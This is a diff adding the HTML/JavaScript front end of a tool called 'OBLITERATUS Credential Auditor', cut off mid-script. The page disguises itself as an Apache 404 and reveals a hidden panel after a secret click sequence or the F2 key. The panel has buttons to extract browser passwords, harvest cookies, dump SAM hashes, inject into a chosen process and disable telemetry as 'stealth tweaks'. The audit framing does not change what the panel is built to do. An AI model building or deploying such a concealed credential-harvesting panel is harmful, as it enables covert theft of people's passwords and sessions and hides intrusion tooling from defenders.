@@ -1,0 +1,1095 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>404 Not Found</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0b0e14;
+            --bg-2: #10141d;
+            --panel: #161b26;
+            --panel-2: #1c2230;
+            --panel-3: #232b3c;
+            --border: #293346;
+            --border-2: #34425a;
+            --text: #dce4ee;
+            --text-2: #8f9db3;
+            --dim: #5d6b82;
+            --accent: #00a2ed;
+            --accent-2: #0081bf;
+            --accent-glow: rgba(0, 162, 237, .25);
+            --green: #22c55e;
+            --red: #ef4444;
+            --amber: #f59e0b;
+            --violet: #8b5cf6;
+            --mono: 'JetBrains Mono', ui-monospace, 'Cascadia Code', Consolas, monospace;
+            --ui: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            --radius: 10px;
+            --sidebar-w: 232px;
+            --shadow: 0 20px 50px -10px rgba(0,0,0,.85), 0 2px 10px rgba(0,0,0,.5);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: var(--ui);
+            background-color: var(--bg);
+            color: var(--text);
+            height: 100vh;
+            overflow: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ---------- 404 facade (unchanged camouflage) ---------- */
+        #apache-view { margin: 40px; user-select: none; }
+        .apache-view h1, #apache-view h1 { font-size: 24px; font-weight: 500; cursor: default; }
+        #apache-view p { margin-top: 12px; color: var(--text); }
+        #apache-view hr { margin-top: 24px; border: none; border-top: 1px solid var(--border); }
+        #apache-view .footer { margin-top: 8px; color: var(--text-2); font-size: 13px; }
+
+        /* ---------- App shell ---------- */
+        #app { display: none; height: 100vh; }
+
+        #sidebar {
+            width: var(--sidebar-w);
+            flex-shrink: 0;
+            background: linear-gradient(180deg, var(--panel), var(--bg-2));
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 18px 18px 16px;
+            border-bottom: 1px solid var(--border);
+        }
+        .brand svg { flex-shrink: 0; }
+        .brand-name { font-weight: 700; font-size: 15px; letter-spacing: .4px; }
+        .brand-sub { font-size: 10px; color: var(--dim); font-family: var(--mono); letter-spacing: 1px; text-transform: uppercase; }
+
+        .nav { flex: 1; padding: 12px 10px; display: flex; flex-direction: column; gap: 2px; overflow-y: auto; }
+        .nav-label { font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 1.2px; color: var(--dim); padding: 14px 10px 6px; }
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 9px 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            color: var(--text-2);
+            font-size: 13px;
+            font-weight: 500;
+            border: 1px solid transparent;
+            transition: background .12s, color .12s, border-color .12s;
+            background: none;
+            width: 100%;
+            text-align: left;
+            font-family: var(--ui);
+        }
+        .nav-item svg { width: 16px; height: 16px; flex-shrink: 0; opacity: .8; }
+        .nav-item:hover { background: rgba(255,255,255,.05); color: var(--text); }
+        .nav-item.active {
+            background: rgba(0,162,237,.12);
+            border-color: rgba(0,162,237,.35);
+            color: var(--accent);
+        }
+        .nav-item.active svg { opacity: 1; }
+
+        .side-footer { padding: 12px; border-top: 1px solid var(--border); display: flex; flex-direction: column; gap: 8px; }
+        #admin-status {
+            font-size: 11px;
+            color: var(--accent);
+            background: rgba(0,162,237,.12);
+            padding: 6px 10px;
+            border-radius: 6px;
+            border: 1px solid rgba(0,162,237,.3);
+            font-family: var(--mono);
+            letter-spacing: .3px;
+            text-align: center;
+        }
+
+        #main { flex: 1; display: flex; flex-direction: column; min-width: 0; }
+
+        #topbar {
+            height: 54px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 0 22px;
+            background: rgba(16,20,29,.9);
+            border-bottom: 1px solid var(--border);
+            backdrop-filter: blur(12px);
+        }
+        #view-title { font-size: 15px; font-weight: 600; letter-spacing: .2px; }
+        #view-desc { font-size: 12px; color: var(--dim); margin-left: -6px; }
+        .topbar-right { margin-left: auto; display: flex; align-items: center; gap: 14px; }
+        #ws-pill {
+            font-size: 10.5px; font-family: var(--mono); font-weight: 600;
+            padding: 4px 10px; border-radius: 999px;
+            color: var(--dim); border: 1px solid var(--border-2); background: var(--panel-2);
+        }
+        #ws-pill.on { color: var(--green); border-color: rgba(34,197,94,.4); background: rgba(34,197,94,.1); }
+        #clock { font-variant-numeric: tabular-nums; font-weight: 500; color: var(--text-2); font-family: var(--mono); font-size: 12px; }
+
+        #content { flex: 1; overflow-y: auto; padding: 22px; }
+        .view { display: none; animation: fadein .15s ease; }
+        .view.active { display: block; }
+        @keyframes fadein { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
+
+        /* ---------- Components ---------- */
+        .card {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 18px;
+        }
+        .card h3 { font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: .8px; color: var(--text-2); margin-bottom: 12px; }
+
+        .grid-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; margin-bottom: 18px; }
+        .stat-label { font-size: 11px; text-transform: uppercase; letter-spacing: .8px; color: var(--dim); font-weight: 600; }
+        .stat-value { font-size: 22px; font-weight: 700; margin-top: 8px; font-family: var(--mono); }
+        .stat-value.accent { color: var(--accent); }
+        .stat-value.green { color: var(--green); }
+        .stat-value.dim { color: var(--dim); }
+
+        .btn {
+            border: 1px solid transparent;
+            border-radius: 8px;
+            padding: 9px 16px;
+            font-size: 12.5px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all .15s;
+            font-family: var(--ui);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 7px;
+        }
+        .btn:active { transform: scale(.98); }
+        .btn:disabled { opacity: .45; cursor: not-allowed; }
+        .btn-primary { background: var(--accent); color: #fff; box-shadow: 0 2px 8px rgba(0,162,237,.3); }
+        .btn-primary:hover:not(:disabled) { background: var(--accent-2); }
+        .btn-danger { background: var(--red); color: #fff; box-shadow: 0 2px 8px rgba(239,68,68,.3); }
+        .btn-danger:hover:not(:disabled) { background: #dc2626; }
+        .btn-ghost { background: var(--panel-3); color: var(--text); border-color: var(--border-2); }
+        .btn-ghost:hover:not(:disabled) { background: var(--border-2); }
+        .btn-sm { padding: 6px 12px; font-size: 11.5px; border-radius: 6px; }
+        .btn-row { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin-bottom: 14px; }
+
+        table { width: 100%; border-collapse: collapse; }
+        th {
+            text-align: left;
+            color: var(--text-2);
+            font-size: 11px;
+            padding: 9px 12px;
+            border-bottom: 1px solid var(--border);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: .6px;
+            background: var(--panel-2);
+            font-family: var(--mono);
+            position: sticky;
+            top: 0;
+            z-index: 1;
+        }
+        td { padding: 9px 12px; border-bottom: 1px solid rgba(255,255,255,.03); font-size: 12.5px; }
+        .row-proc:hover { background: rgba(255,255,255,.05); cursor: pointer; }
+        .selected { background: rgba(0,162,237,.18) !important; outline: 1px solid rgba(0,162,237,.5); }
+        .empty-row td { text-align: center; padding: 26px; color: var(--dim); }
+
+        .table-wrap { border: 1px solid var(--border); border-radius: var(--radius); overflow: auto; background: var(--panel); }
+        .table-wrap.proc { height: 420px; }
+        .table-wrap.intel { height: 460px; }
+        .table-wrap.audit { height: 430px; }
+
+        input[type="text"] {
+            background: var(--bg-2);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 9px 12px;
+            border-radius: 8px;
+            width: 100%;
+            outline: none;
+            font-family: var(--mono);
+            transition: all .15s;
+            font-size: 12.5px;
+        }
+        input[type="text"]:focus { border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-glow); }
+
+        .terminal {
+            font-family: var(--mono);
+            background: #090c12;
+            color: #c9d5e8;
+            padding: 12px 14px;
+            border-radius: var(--radius);
+            overflow-y: auto;
+            font-size: 12px;
+            line-height: 1.55;
+            border: 1px solid var(--border);
+            box-shadow: inset 0 2px 8px rgba(0,0,0,.6);
+        }
+
+        pre { margin: 0; white-space: pre-wrap; font-family: inherit; }
+
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: rgba(0,0,0,.2); }
+        ::-webkit-scrollbar-thumb { background: var(--border-2); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--dim); }
+
+        /* ---------- Modal ---------- */
+        .modal-backdrop {
+            position: fixed; inset: 0; z-index: 20000;
+            background: rgba(5,8,12,.72);
+            backdrop-filter: blur(4px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-backdrop.open { display: flex; }
+        .modal {
+            width: 440px; max-width: calc(100vw - 40px);
+            background: var(--panel);
+            border: 1px solid var(--border-2);
+            border-radius: 12px;
+            box-shadow: var(--shadow);
+            animation: modalin .16s cubic-bezier(.2,.9,.3,1);
+        }
+        @keyframes modalin { from { opacity: 0; transform: scale(.95); } to { opacity: 1; transform: none; } }
+        .modal-head {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 14px 18px; border-bottom: 1px solid var(--border);
+        }
+        .modal-title { font-size: 14px; font-weight: 600; }
+        .modal-x {
+            background: none; border: none; color: var(--text-2); cursor: pointer;
+            font-size: 15px; padding: 2px 6px; border-radius: 5px; font-family: var(--ui);
+        }
+        .modal-x:hover { background: rgba(255,255,255,.08); color: var(--text); }
+        .modal-body { padding: 18px; font-size: 13px; color: var(--text-2); line-height: 1.55; }
+        .modal-body .mono { font-family: var(--mono); color: var(--text); }
+        .modal-foot { padding: 14px 18px; border-top: 1px solid var(--border); display: flex; justify-content: flex-end; gap: 8px; }
+
+        /* ---------- Toasts ---------- */
+        #toasts { position: fixed; right: 18px; bottom: 18px; z-index: 30000; display: flex; flex-direction: column; gap: 8px; max-width: 380px; }
+        .toast {
+            background: var(--panel-2);
+            border: 1px solid var(--border-2);
+            border-left: 3px solid var(--accent);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-size: 12.5px;
+            box-shadow: var(--shadow);
+            animation: toastin .18s ease;
+            color: var(--text);
+        }
+        .toast.SUCCESS { border-left-color: var(--green); }
+        .toast.ERROR { border-left-color: var(--red); }
+        .toast .t-time { font-family: var(--mono); font-size: 10.5px; color: var(--dim); margin-right: 8px; }
+        @keyframes toastin { from { opacity: 0; transform: translateX(12px); } to { opacity: 1; transform: none; } }
+
+        .hint { font-size: 12px; color: var(--dim); line-height: 1.5; }
+        .split { display: grid; grid-template-columns: 1fr; gap: 14px; }
+        @media (min-width: 1100px) { .split.two { grid-template-columns: 340px 1fr; } }
+    </style>
+<base target="_blank">
+</head>
+<body onkeydown="if(event.key==='F2')window.unlock()">
+    <!-- Simulated Apache 404: cosmetic camouflage. Real boundary = per-run token. -->
+    <div id="apache-view">
+        <div style="position:fixed; top:0; left:0; width:60px; height:60px; cursor:pointer;" onclick="window.unlock()"></div>
+        <h1 onclick="window.handleTrigger()">Not Found</h1>
+        <p>The requested URL was not found on this server.</p>
+        <hr><div class="footer">Apache/2.4.52 (Ubuntu) Server at localhost Port 8080</div>
+    </div>
+
+    <div id="app">
+        <aside id="sidebar">
+            <div class="brand">
+                <svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    <path d="M9 12l2 2 4-4"/>
+                </svg>
+                <div>
+                    <div class="brand-name">OBLITERATUS</div>
+                    <div class="brand-sub">Credential Auditor</div>
+                </div>
+            </div>
+
+            <nav class="nav">
+                <button class="nav-item active" data-view="dash" onclick="window.showView('dash')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="9" rx="1"/><rect x="14" y="3" width="7" height="5" rx="1"/><rect x="14" y="12" width="7" height="9" rx="1"/><rect x="3" y="16" width="7" height="5" rx="1"/></svg>
+                    Overview
+                </button>
+
+                <div class="nav-label">Host</div>
+                <button class="nav-item" data-view="proc" onclick="window.showView('proc')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M9 9h6v6H9z"/><path d="M9 1V4M15 1V4M9 20V23M15 20V23M20 9H23M20 15H23M1 9H4M1 15H4"/></svg>
+                    Processes
+                </button>
+                <button class="nav-item" data-view="opt" onclick="window.showView('opt')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
+                    Optimizer
+                </button>
+                <button class="nav-item" data-view="cons" onclick="window.showView('cons')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+                    Terminal
+                </button>
+                <button class="nav-item" data-view="hex" onclick="window.showView('hex')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+                    Hex Viewer
+                </button>
+
+                <div class="nav-label">Modules</div>
+                <button class="nav-item" data-view="intel" onclick="window.showView('intel')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                    Decrypter
+                </button>
+                <button class="nav-item" data-view="sig" onclick="window.showView('sig')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>
+                    Architect
+                </button>
+                <button class="nav-item" data-view="audit" onclick="window.showView('audit')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="9" y1="13" x2="15" y2="13"/><line x1="9" y1="17" x2="13" y2="17"/></svg>
+                    Audit
+                </button>
+            </nav>
+
+            <div class="side-footer">
+                <span id="admin-status">[CHECKING...]</span>
+                <button class="btn btn-ghost btn-sm" onclick="window.relock()" title="Return to the 404 page">
+                    <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>
+                    Relock
+                </button>
+            </div>
+        </aside>
+
+        <div id="main">
+            <header id="topbar">
+                <span id="view-title">Overview</span>
+                <span id="view-desc">host snapshot &amp; quick actions</span>
+                <div class="topbar-right">
+                    <span id="ws-pill" title="WebSocket console channel">WS · …</span>
+                    <span id="clock"></span>
+                </div>
+            </header>
+
+            <section id="content">
+
+                <!-- OVERVIEW -->
+                <div class="view active" id="view-dash">
+                    <div class="grid-stats">
+                        <div class="card">
+                            <div class="stat-label">Privilege</div>
+                            <div class="stat-value dim" id="dash-priv">…</div>
+                        </div>
+                        <div class="card">
+                            <div class="stat-label">Injection Target</div>
+                            <div class="stat-value accent" id="dash-target">none</div>
+                        </div>
+                        <div class="card">
+                            <div class="stat-label">Console Channel</div>
+                            <div class="stat-value dim" id="dash-ws">…</div>
+                        </div>
+                        <div class="card">
+                            <div class="stat-label">Payload</div>
+                            <div class="stat-value dim" id="dash-hex">…</div>
+                        </div>
+                    </div>
+
+                    <div class="split two">
+                        <div class="card">
+                            <h3>Quick actions</h3>
+                            <div style="display:flex; flex-direction:column; gap:8px;">
+                                <button class="btn btn-primary" onclick="window.showView('audit'); window.runAudit()">▶ Run attack-surface audit</button>
+                                <button class="btn btn-ghost" onclick="window.showView('intel'); window.extractIntel()">🔑 Extract passwords</button>
+                                <button class="btn btn-ghost" onclick="window.showView('intel'); window.extractCookies()">🍪 Harvest cookies</button>
+                                <button class="btn btn-ghost" onclick="window.showView('cons')">⌘ Open terminal</button>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <h3>About</h3>
+                            <p class="hint">
+                                OBLITERATUS answers one question — <em>would Mimikatz work against this host?</em> — with
+                                evidence: registry state, token privileges, service configuration and browser store
+                                exposure, each mapped to the Mimikatz module and MITRE technique it corresponds to.
+                                Credential and injection modules are locked until started with
+                                <span class="mono" style="color:var(--text)">--enable-collect</span> /
+                                <span class="mono" style="color:var(--text)">--enable-inject</span>.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PROCESSES -->
+                <div class="view" id="view-proc">
+                    <div class="btn-row">
+                        <input type="text" id="p-search" placeholder="Filter processes…" oninput="window.filterProcs()" style="max-width:320px;">
+                        <button class="btn btn-ghost btn-sm" onclick="window.fetchProcs()">↻ Refresh</button>
+                        <span class="hint" id="proc-count"></span>
+                    </div>
+                    <div class="table-wrap proc">
+                        <table>
+                            <thead><tr><th>PID</th><th>IMAGE</th><th>OWNER</th><th>MEM</th></tr></thead>
+                            <tbody id="proc-body">
+                                <tr class="empty-row"><td colspan="4">Loading process table…</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <p class="hint" style="margin-top:10px;">Click a row to set the Architect injection target.</p>
+                </div>
+
+                <!-- OPTIMIZER -->
+                <div class="view" id="view-opt">
+                    <div class="card">
+                        <h3>Stealth tweaks</h3>
+                        <p class="hint" style="margin-bottom:14px;">One-click telemetry &amp; privacy hardening: disables diagnostic tracking services and related registry policies.</p>
+                        <button class="btn btn-primary" onclick="window.applyTweaks()">⚡ Apply stealth tweaks</button>
+                        <div id="opt-log" class="terminal" style="height:260px; margin-top:14px;"></div>
+                    </div>
+                </div>
+
+                <!-- CONSOLE -->
+                <div class="view" id="view-cons">
+                    <div class="card">
+                        <h3>Command console</h3>
+                        <div id="console-out" class="terminal" style="height:400px; margin-bottom:12px;"></div>
+                        <div style="display:flex; gap:8px;">
+                            <input type="text" id="cmd-in" placeholder="Command…" onkeydown="if(event.key==='Enter')window.runCmd()">
+                            <button class="btn btn-primary" onclick="window.runCmd()">Run</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- HEX -->
+                <div class="view" id="view-hex">
+                    <div class="card">
+                        <h3>Payload integrity</h3>
+                        <div class="btn-row">
+                            <button class="btn btn-ghost btn-sm" onclick="window.loadHex()">↻ Reload payload</button>
+                        </div>
+                        <div class="terminal" id="hex-body" style="font-size:11px; min-height:280px; color:var(--accent);">[LOADING_PAYLOAD…]</div>
+                    </div>
+                </div>
+
+                <!-- DECRYPTER -->
+                <div class="view" id="view-intel">
+                    <div class="btn-row">
+                        <button class="btn btn-primary btn-sm intel-tab" data-mode="creds" onclick="window.extractIntel()">🔑 Passwords</button>
+                        <button class="btn btn-ghost btn-sm intel-tab" data-mode="cookies" onclick="window.extractCookies()">🍪 Cookies</button>
+                        <button class="btn btn-ghost btn-sm intel-tab" data-mode="nexus" onclick="window.extractNexus()">🔗 Nexus correlation</button>
+                        <button class="btn btn-ghost btn-sm intel-tab" data-mode="sam" onclick="window.extractSAM()">🗝 SAM hashes</button>
+                        <span style="flex:1"></span>
+                        <button class="btn btn-ghost btn-sm" onclick="window.exportIntelCSV()">[Export CSV]</button>
+                    </div>
+                    <div class="table-wrap intel">
+                        <table>
+                            <thead id="intel-head"><tr><th>MODE</th><th>—</th><th>—</th><th>—</th></tr></thead>
+                            <tbody id="intel-body">
+                                <tr class="empty-row"><td colspan="4">Choose an operation above. Results stream over the WebSocket channel.</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <p class="hint" style="margin-top:10px;">Collection requires <span class="mono" style="color:var(--text)">--enable-collect</span>. Rows render from same-origin WebSocket data only.</p>
+                </div>
+
+                <!-- ARCHITECT -->
+                <div class="view" id="view-sig">
+                    <div class="split two">
+                        <div class="card">
+                            <h3>Injection target</h3>
+                            <input type="text" id="target-pid" readonly placeholder="no PID selected" style="text-align:center; color:var(--accent); font-size:20px; letter-spacing:2px; margin-bottom:14px;">
+                            <p class="hint" style="margin-bottom:14px;">Select a process in the Processes view, then dispatch the payload. Requires <span class="mono" style="color:var(--text)">--enable-inject</span>; W^X transitions only (RW → RX, never RWX).</p>
+                            <button class="btn btn-danger" style="width:100%;" onclick="window.injectSignal()">⚡ Quantum Sync</button>
+                        </div>
+                        <div class="card">
+                            <h3>Status</h3>
+                            <div id="sig-status" class="terminal" style="min-height:180px;">[IDLE]</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- AUDIT -->
+                <div class="view" id="view-audit">
+                    <div class="btn-row">
+                        <button class="btn btn-primary btn-sm" onclick="window.runAudit()">▶ Run audit</button>
+                        <button class="btn btn-ghost btn-sm" onclick="window.exportAuditCSV()">[Export CSV]</button>
+                        <span id="audit-summary" style="font-family:var(--mono); font-size:11.5px; color:var(--text-2); margin-left:auto;"></span>
+                    </div>
+                    <div class="table-wrap audit">
+                        <table>
+                            <thead><tr><th>ID</th><th>SEV</th><th>STATUS</th><th>CONTROL</th><th>EVIDENCE</th></tr></thead>
+                            <tbody id="audit-body">
+                                <tr class="empty-row"><td colspan="5">Press Run Audit to assess this host against the Mimikatz playbook.</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+    </div>
+
+    <!-- Confirmation modal -->
+    <div class="modal-backdrop" id="modal-root" onclick="if(event.target===this)window.hideModal()">
+        <div class="modal">
+            <div class="modal-head">
+                <span class="modal-title" id="modal-title">Confirm</span>
+                <button class="modal-x" onclick="window.hideModal()">✕</button>
+            </div>
+            <div class="modal-body" id="modal-body"></div>
+            <div class="modal-foot" id="modal-foot"></div>
+        </div>
+    </div>
+
+    <div id="toasts"></div>
+
+    <script>
+        window.clicks = 0;
+        window.selectedPid = null;
+        window.apiToken = "SIGNAL_" + location.port;
+        window._ws = null;
+        window._a7Data = [];
+        window._cookiesData = [];
+        window._samData = [];
+        window._hexLoaded = false;
+        window._intelMode = '';
+
+        const VIEW_META = {
+            dash:  ['Overview', 'host snapshot & quick actions'],
+            proc:  ['Processes', 'live table · click a row to target it'],
+            opt:   ['System Optimizer', 'telemetry & privacy hardening'],
+            cons:  ['Terminal', 'command console'],
+            hex:   ['Hex Viewer', 'payload integrity inspection'],
+            intel: ['Decrypter', 'authorised collection modules'],
+            sig:   ['Architect', 'injection research module'],
+            audit: ['Attack-Surface Audit', 'Mimikatz checklist'],
+        };
+
+        /* Escape untrusted server-side data before it touches innerHTML.
+           Stored XSS defence: credential rows contain attacker-influenceable
+           origin URLs from browser databases. */
+        window.esc = function(v) {
+            return String(v == null ? '' : v).replace(/[&<>"']/g, c => (
+                {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]
+            ));
+        };
+
+        /* Authenticated fetch wrapper: attaches the per-run token and turns
+           non-2xx responses (incl. 403 "module disabled") into readable
+           errors for the console log. */
+        window.req = async function(url, opts) {
+            opts = opts || {};
+            opts.headers = Object.assign({'X-Signal-Token': window.apiToken}, opts.headers || {});
+            const r = await fetch(url, opts);
+            if (!r.ok) {
+                let detail = 'HTTP ' + r.status;
+                try {
+                    const j = await r.json();
+                    if (j.hint) detail += ' — ' + j.hint;
+                    else if (j.error) detail += ' — ' + j.error;
+                } catch(e) {}
+                throw new Error(detail);
+            }
+            return r;
+        };
+
+        /* ---------- facade ---------- */
+        window.handleTrigger = function() {
+            if (++window.clicks === 3) window.unlock();
+        };
+
+        window.unlock = function() {
+            document.getElementById('apache-view').style.display = 'none';
+            document.getElementById('app').style.display = 'flex';
+            window.initWS();
+            window.fetchProcs();
+            window.checkStatus();
+            window.showView('dash');
+        };
+
+        window.relock = function() {
+            document.getElementById('app').style.display = 'none';
+            document.getElementById('apache-view').style.display = 'block';
+        };
+
+        /* ---------- navigation ---------- */
+        window.showView = function(id) {
+            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+            const v = document.getElementById('view-' + id);
+            if (v) v.classList.add('active');
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.view === id));
+            const meta = VIEW_META[id] || ['', ''];
+            document.getElementById('view-title').innerText = meta[0];
+            document.getElementById('view-desc').innerText = meta[1];
+            if (id === 'hex' && !window._hexLoaded) window.loadHex();
+            if (id === 'proc') window.fetchProcs();
+        };
+
+        /* ---------- modal ---------- */
+        window.showModal = function() { document.getElementById('modal-root').classList.add('open'); };
+        window.hideModal = function() { document.getElementById('modal-root').classList.remove('open'); };
+
+        window.confirmModal = function(title, html, okLabel, danger) {
+            return new Promise(function(resolve) {
+                document.getElementById('modal-title').innerText = title;
+                document.getElementById('modal-body').innerHTML = html;
+                const foot = document.getElementById('modal-foot');
+                foot.innerHTML = '';
+                const cancel = document.createElement('button');
+                cancel.className = 'btn btn-ghost';
+                cancel.innerText = 'Cancel';
+                cancel.onclick = function() { window.hideModal(); resolve(false); };
+                const ok = document.createElement('button');
+                ok.className = 'btn ' + (danger ? 'btn-danger' : 'btn-primary');
+                ok.innerText = okLabel || 'Confirm';
+                ok.onclick = function() { window.hideModal(); resolve(true); };
+                foot.appendChild(cancel);
+                foot.appendChild(ok);
+                window.showModal();
+            });
+        };
+
+        /* ---------- toasts + log ---------- */
+        window.toast = function(m, l) {
+            const wrap = document.getElementById('toasts');
+            // Cap concurrent toasts: a harvest burst must not flood the DOM.
+            while (wrap.childElementCount >= 4) wrap.removeChild(wrap.firstElementChild);
+            const d = document.createElement('div');
+            d.className = 'toast ' + (l || 'INFO');
+            d.innerHTML = `<span class="t-time">${new Date().toLocaleTimeString()}</span>${window.esc(m)}`;
+            wrap.appendChild(d);
+            setTimeout(function() { d.remove(); }, 5200);
+        };
+
+        /* Log lines are queued and flushed once per animation frame: harvest
+           sweeps broadcast hundreds of progress lines per second and a DOM
+           insert + forced reflow per line froze the tab ("page unresponsive"). */
+        window._logQ = [];
+        window._logRAF = 0;
+        window.log = function(m, l) {
+            if (l === 'SUCCESS' || l === 'ERROR') window.toast(m, l);
+            window._logQ.push([m, l]);
+            if (!window._logRAF) window._logRAF = requestAnimationFrame(window._flushLog);
+        };
+        window._flushLog = function() {
+            window._logRAF = 0;
+            const q = window._logQ;
+            window._logQ = [];
+            const c = document.getElementById('console-out');
+            if (!c || q.length === 0) return;
+            let html = '';
+            for (const it of q) {
+                const col = it[1] === 'SUCCESS' ? '#00ff41' : it[1] === 'ERROR' ? '#ff3b30' : '#888';
+                html += `<div style="color:${col}; margin-bottom:2px;">[${new Date().toLocaleTimeString()}] ${window.esc(it[0])}</div>`;
+            }
+            c.insertAdjacentHTML('beforeend', html);
+            // Unbounded console growth made every later scroll a big layout.
+            while (c.childElementCount > 400) c.removeChild(c.firstElementChild);
+            c.scrollTop = c.scrollHeight;
+        };
+
+        /* ---------- websocket ---------- */
+        window.initWS = function() {
+            try {
+                const socket = new WebSocket(`ws://${location.host}/ws?t=${encodeURIComponent(window.apiToken)}`);
+                window._ws = socket;
+                socket.onopen = function() { window._setWS(true); };
+                socket.onclose = function() { window._setWS(false); };
+                socket.onerror = function() { window._setWS(false); window.log('WebSocket disconnected', 'ERROR'); };
+                socket.onmessage = function(e) {
+                    const d = JSON.parse(e.data);
+                    if (d.m) window.log(d.m, d.l);
+                    if (d.type === 'a7_chunk') { window._a7Data = window._a7Data.concat(d.entries); window.log('Chunk: ' + d.entries.length + ' from ' + d.browser, 'INFO'); }
+                    if (d.type === 'a7_done') { window._renderA7(window._a7Data); window._a7Data = []; }
+                    if (d.type === 'cookies_chunk') { window._cookiesData = window._cookiesData.concat(d.entries); window.log('Chunk: ' + d.entries.length + ' from ' + d.browser, 'INFO'); }
+                    if (d.type === 'cookies_done') { window._renderCookies(window._cookiesData); window._cookiesData = []; }
+                    if (d.type === 'sam_chunk') { window._samData = window._samData.concat(d.entries); window.log('SAM chunk: ' + d.entries.length + ' entries', 'INFO'); }
+                    if (d.type === 'sam_done') { window._renderSAM(window._samData); window._samData = []; }
+                };
+            } catch(e) {
+                window.log('WebSocket init failed', 'ERROR');
+            }
+        };
+
+        window._setWS = function(on) {
+            const pill = document.getElementById('ws-pill');
+            const dash = document.getElementById('dash-ws');
+            if (pill) { pill.innerText = on ? 'WS · LIVE' : 'WS · DOWN'; pill.classList.toggle('on', on); }
+            if (dash) { dash.innerText = on ? 'LIVE' : 'DOWN'; dash.className = 'stat-value ' + (on ? 'green' : 'dim'); }
+        };
+
+        /* ---------- status / hex ---------- */
+        window.checkStatus = async function() {
+            try {
+                const r = await window.req('/v1/sys/st');
+                const t = await r.text();
+                const isAdmin = t.includes('ADMIN');
+                const el = document.getElementById('admin-status');
+                el.innerText = '[' + t + ']';
